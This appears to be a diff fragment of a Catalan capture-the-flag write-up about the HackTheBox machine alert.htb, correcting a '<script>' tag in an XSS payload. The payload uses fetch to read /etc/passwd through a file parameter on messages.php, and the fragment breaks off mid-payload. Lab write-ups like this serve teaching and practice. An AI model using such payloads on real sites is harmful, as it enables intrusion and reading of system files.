@@ -216,7 +216,7 @@ Priority: u=4
 
 Per tant, ara ja podem a¡començar a buscar i extreure dades. amb XSS anar provant a veure si aconseguim llegir algun fitxer interessant. A veure si podem llegir el que hi ha al home. Al no tenir una reverse shell, haurem d'utilitzar el payload per llegir l'/etc/passwd, per fer això hem deixat el payload així. Després de vàries proves per fer XSS i buscar el fitxer /etc/passwd, la versió que ha funcionat el payload ha estat la següent:
 ```
-script>
+<script>
 fetch("http://alert.htb/messages.php?file=/etc/passwd")
   .then(response => response.text())
   .then(data => {
